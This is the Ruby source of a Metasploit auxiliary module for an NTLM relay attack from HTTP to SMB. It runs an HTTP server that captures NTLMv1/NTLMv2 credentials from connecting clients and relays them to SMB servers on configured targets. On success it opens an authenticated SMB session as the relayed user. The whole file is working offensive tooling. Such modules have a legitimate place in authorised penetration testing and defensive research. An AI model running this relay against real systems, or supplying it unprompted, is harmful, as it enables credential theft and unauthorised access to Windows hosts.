# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::Relay
  include Msf::Auxiliary::CommandShell

  attr_accessor :service

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows HTTP to SMB Relay',
        'Description' => %q{
          This module supports running an HTTP server which validates credentials, and
          then attempts to execute a relay attack against an SMB server on the
          configured RHOSTS hosts.

          If the relay succeeds, an SMB session to the target will be created. This can
          be used by any modules that support SMB sessions.

          Supports HTTP and captures NTLMv1 as well as NTLMv2 hashes.
        },
        'Author' => [
          'jheysel-r7' # module
        ],
        'License' => MSF_LICENSE,
        'DefaultTarget' => 0,
        'Actions' => [
          [ 'CREATE_SMB_SESSION', { 'Description' => 'Create an SMB session' } ]
        ],
        'PassiveActions' => [ 'CREATE_SMB_SESSION' ],
        'DefaultAction' => 'CREATE_SMB_SESSION',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ACCOUNT_LOCKOUTS ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(445)
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true])
      ]
    )
  end

  def srvport
    datastore['SRVPORT']
  end

  def relay_targets
    Msf::Exploit::Remote::Relay::TargetList.new(
      :smb,
      datastore['RPORT'],
      datastore['RHOSTS'],
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def check_options
    unless framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
      fail_with(Failure::BadConfig, 'This module requires the `smb_session_type` feature to be enabled. Please enable this feature using `features set smb_session_type true`')
    end
  end

  def run
    check_options

    start_service
    print_status('Server started.')
    @http_relay_service.wait if @http_relay_service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    print_good('Relay succeeded')
    session_setup(relay_connection, relay_identity)
  rescue StandardError => e
    elog('Failed to setup the session', error: e)
  end

  def session_setup(relay_connection, relay_identity)
    rstream = relay_connection.dispatcher.tcp_socket
    sess = Msf::Sessions::SMB.new(
      rstream,
      {
        client: relay_connection
      }
    )
    domain, _, username = relay_identity.partition('\\')
    datastore_options = {
      'RHOST' => relay_connection.target.ip,
      'RPORT' => relay_connection.target.port,
      'DOMAIN' => domain,
      'USERNAME' => username
    }
    start_session(self, nil, datastore_options, false, sess.rstream, sess)
  end
end
